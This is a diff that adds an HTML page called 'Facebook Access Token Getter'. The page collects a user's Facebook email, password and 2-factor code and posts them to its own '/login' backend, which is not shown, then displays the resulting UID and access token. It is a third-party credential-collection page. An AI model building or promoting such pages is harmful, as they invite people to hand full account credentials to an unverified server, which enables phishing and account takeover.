@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Access Token Getter</title>
+    <meta content="Facebook Access Token Getter" name="description">
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Facebook Access Token Getter" />
+    <meta property="og:description" content="Retrieve your Facebook access token by logging in with your email and password. For enhanced security, use 2-factor authentication if available." />
+    <meta property="og:url" content="https://tokengettereaady6v7-by-polongdev.vercel.app" />
+    <meta property="og:site_name" content="PolongDev Project" />
+    <meta property="og:image" content="https://files.catbox.moe/2qtjdg.jpg" />
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+        .bubble-input {
+            border-radius: 50px;
+            padding: 12px 20px;
+            border: none;
+            background-color: #1a202c;
+            color: white;
+            width: 100%;
+            box-sizing: border-box;
+            transition: background-color 0.3s, box-shadow 0.3s;
+        }
+        .bubble-input:focus {
+            background-color: #2d3748;
+            box-shadow: 0 0 5px #667eea;
+            outline: none;
+        }
+        .bubble-button, .back-button {
+            border-radius: 50px;
+            padding: 12px 20px;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.3s;
+            width: 100%;
+            margin-top: 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .bubble-button:hover, .back-button:hover {
+            background: linear-gradient(90deg, #5a67d8 0%, #6b46c1 100%);
+            transform: scale(1.05);
+        }
+        .loading-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .table-container {
+            overflow-x: auto;
+            margin-top: 1rem;
+        }
+        .styled-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            font-size: 1em;
+            min-width: 400px;
+            background-color: #2d3748;
+            color: #ffffff;
+            border-radius: 10px 10px 0 0;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
+        }
+        .styled-table th,
+        .styled-table td {
+            padding: 12px 15px;
+            text-align: left;
+        }
+        .styled-table th {
+            background-color: #4a5568;
+        }
+        .styled-table tbody tr {
+            border-bottom: 1px solid #dddddd;
+        }
+        .styled-table tbody tr:nth-of-type(even) {
+            background-color: #3b4252;
+        }
+        .styled-table tbody tr:last-of-type {
+            border-bottom: 2px solid #667eea;
+        }
+        .styled-table tbody tr.active-row {
+            font-weight: bold;
+            color: #667eea;
+        }
+        .styled-table td:first-child {
+            border-top-left-radius: 10px;
+            border-bottom-left-radius: 10px;
+        }
+        .styled-table td:last-child {
+            border-top-right-radius: 10px;
+            border-bottom-right-radius: 10px;
+        }
+        .dark-card {
+            background-color: #2d3748;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.3);
+            max-width: 100%;
+        }
+        .dark-card h2 {
+            margin-bottom: 0.5rem;
+        }
+        .dark-card p {
+            margin-bottom: 1.5rem;
+            font-size: 0.875rem;
+            color: #a0aec0;
+        }
+        .dark-card label {
+            margin-bottom: 0.5rem;
+        }
+        .dark-card .bubble-input,
+        .dark-card .bubble-button {
+            margin-bottom: 1rem;
+        }
+        .hidden {
+            display: none;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        .header div {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+        }
+        @media (max-width: 640px) {
+            .header {
+                flex-direction: column;
+            }
+            .header div {
+                margin-bottom: 0.5rem;
+                width: 100%;
+                text-align: center;
+            }
+        }
+        .copy-button {
+            cursor: pointer;
+            color: #667eea;
+            margin-left: 10px;
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-md">
+        <div class="dark-card shadow-lg">
+            <div class="header">
+                <div id="time" class="text-lg font-bold"></div>
+                <div id="ping" class="text-lg font-bold"></div>
+            </div>
+            <h2 class="text-center text-3xl font-bold">Facebook Access Token Getter</h2>
+            <p class="text-center text-gray-400">Retrieve your Facebook access token by logging in with your email and password. For enhanced security, use 2-factor authentication if available.</p>
+            <div class="mb-4">
+                <label class="block text-gray-400 text-sm font-bold mb-2" for="email">
+                    Email
+                </label>
+                <input class="bubble-input" id="email" type="email" placeholder="Email">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-400 text-sm font-bold mb-2" for="password">
+                    Password
+                </label>
+                <input class="bubble-input" id="password" type="password" placeholder="Password">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-400 text-sm font-bold mb-2" for="twofactorCode">
+                    2-Factor Code (skip this if you don't have a 2-Factor Code)
+                </label>
+                <input class="bubble-input" id="twofactorCode" type="text" placeholder="2-Factor Code">
+            </div>
+            <button id="get-token-btn" class="bubble-button" type="button" onclick="getToken()">
+                Get Access Token
+            </button>
+            <button class="back-button" onclick="goBack()">
+                Back to Main Page
+            </button>
+            <div id="message" class="mt-4 text-center"></div>
+            <div id="result-container" class="table-container hidden">
+                <table id="result-table" class="styled-table">
+                    <tbody>
+                        <tr>
+                            <td class="font-bold">UID</td>
+                            <td>
+                                <span id="uid"></span>
+                                <i class="fas fa-copy copy-button" onclick="copyToClipboard('uid')"></i>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="font-bold">Access Token</td>
+                            <td>
+                                <span id="access_token"></span>
+                                <i class="fas fa-copy copy-button" onclick="copyToClipboard('access_token')"></i>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    <script>
+        function measurePing() {
+            var xhr = new XMLHttpRequest();
+            var startTime, endTime;
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    endTime = Date.now();
+                    var pingTime = endTime - startTime;
+                    document.getElementById("ping").textContent = "Ping: " + pingTime + " ms";
+                }
+            };
+            xhr.open("GET", location.href + "?t=" + new Date().getTime());
+            startTime = Date.now();
+            xhr.send();
+        }
+        setInterval(measurePing, 1000);
+
+        function updateTime() {
+            const now = new Date();
+            const options = {
+                timeZone: 'Asia/Manila',
+                hour12: true,
+                hour: 'numeric',
+                minute: 'numeric',
+                second: 'numeric'
+            };
+            const formattedTime = now.toLocaleString('en-US', options);
+            document.getElementById('time').textContent = "Time: " + formattedTime;
+        }
+        updateTime();
+        setInterval(updateTime, 1000);
+
+        async function getToken() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const twofactorCode = document.getElementById('twofactorCode').value;
+            const getTokenBtn = document.getElementById('get-token-btn');
+            const loadingSpinner = document.createElement('div');
+            loadingSpinner.classList.add('loading-spinner');
+            getTokenBtn.appendChild(loadingSpinner);
+
+            const response = await fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password, twofactorCode })
+            });
+
+            const result = await response.json();
+            getTokenBtn.removeChild(loadingSpinner);
+
+            const messageDiv = document.getElementById('message');
+            const resultContainer = document.getElementById('result-container');
+
+            if (result.status) {
+                messageDiv.textContent = 'Login successful!';
+                messageDiv.classList.remove('text-red-500');
+                messageDiv.classList.add('text-green-500');
+                resultContainer.classList.remove('hidden');
+
+                document.getElementById('uid').textContent = result.data.uid || 'N/A';
+                document.getElementById('access_token').textContent = result.data.access_token || 'N/A';
+            } else {
+                messageDiv.textContent = result.message;
+                messageDiv.classList.remove('text-green-500');
+                messageDiv.classList.add('text-red-500');
+                resultContainer.classList.add('hidden');
+            }
+        }
+
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Copied to clipboard!');
+            }).catch(err => {
+                alert('Failed to copy!');
+            });
+        }
+
+        function goBack() {
+            window.location.href = 'https://mainprofile-by-polongdev.vercel.app/';
+        }
+    </script>
+</body>
+</html>
